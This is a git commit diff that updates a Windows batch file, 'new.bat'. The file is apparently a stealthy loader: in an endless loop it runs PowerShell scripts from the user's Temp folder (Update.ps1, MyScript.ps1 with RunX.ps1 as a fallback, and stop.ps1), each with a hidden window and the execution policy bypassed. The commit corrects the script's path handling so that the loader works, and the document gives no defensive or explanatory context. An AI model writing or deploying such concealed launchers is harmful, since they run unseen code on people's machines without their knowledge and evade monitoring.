a7abbd4bf7e2de0ea3771b9d5a06193a8eb1e4d0
cia168168 <147810144+cia168168@users.noreply.github.com>
2024-01-15 14:55:28 +0700

    Update new.bat

--- new.bat
+++ new.bat
@@ -1,15 +1,18 @@
 @echo off
-start /B powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -File "$env:TEMP\Update.ps1" #online
-set sp1=$env:TEMP\MyScript.ps1 #main
-set sp2=$env:TEMP\RunX.ps1 #backup
+powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -File "%USERPROFILE%\AppData\Local\Temp\Update.ps1"
+set sp1="%USERPROFILE%\AppData\Local\Temp\MyScript.ps1"
+set sp2="%USERPROFILE%\AppData\Local\Temp\RunX.ps1"
+
 :loop
 timeout /t 3 >nul
-if exist "%sp1% " (
-    start /B powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -File "%sp1%"
+
+if exist "%sp1%" (
+   powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -File "%sp1%"
 ) else (
-    start /B powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -File "%sp2%"
+   powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -File "%sp2%"
 )
+
 timeout /t 60 >nul
-start /B powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -File "$env:TEMP\stop.ps1" #stop
+start /B powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -File "%USERPROFILE%\AppData\Local\Temp\stop.ps1"
 timeout /t 1 >nul
 goto loop
